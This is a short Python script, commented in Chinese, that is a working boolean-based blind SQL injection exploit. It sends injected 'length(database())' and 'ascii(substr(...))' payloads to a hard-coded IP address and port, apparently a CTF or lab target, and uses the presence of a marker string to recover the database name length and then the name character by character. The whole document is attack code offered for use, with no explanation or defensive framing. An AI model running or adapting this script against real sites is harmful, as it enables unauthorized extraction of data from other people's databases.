"""
布尔盲注 EXP    DongTaXueYuan
1' and  length(database())=8 --+
1' and ascii(substr(database(),1,1))>=97 and ascii(substr(database(),1,1))<=122 --+
"""
import requests

# 获取数据库长度
url = 'http://120.25.24.45:30494/?id=1'
db_len = 0
for i in range(1,20):
    payload1 = "' and  length(database())=%d --+"%i
    res1 = requests.get(url+payload1)
    # print(res1.text)

    if "DongTaXueYuan" in res1.text:
        db_len = i
        print('数据库长度为:%d'%db_len)
        break
# 获取数据库名
db_name = ''
print('=================正在测试=================')
for j in range(db_len):
    for i in range(40, 130):
        payload2 = "' and ascii(substr(database(),%d,1))=%d --+"%(j+1,i)
        res2 = requests.get(url+payload2)
        # print(res2.text)
        if "DongTaXueYuan" in res2.text:
            db_name += chr(i)
            break
print('数据库名为:%s '%db_name)
print('=================测试结束=================')


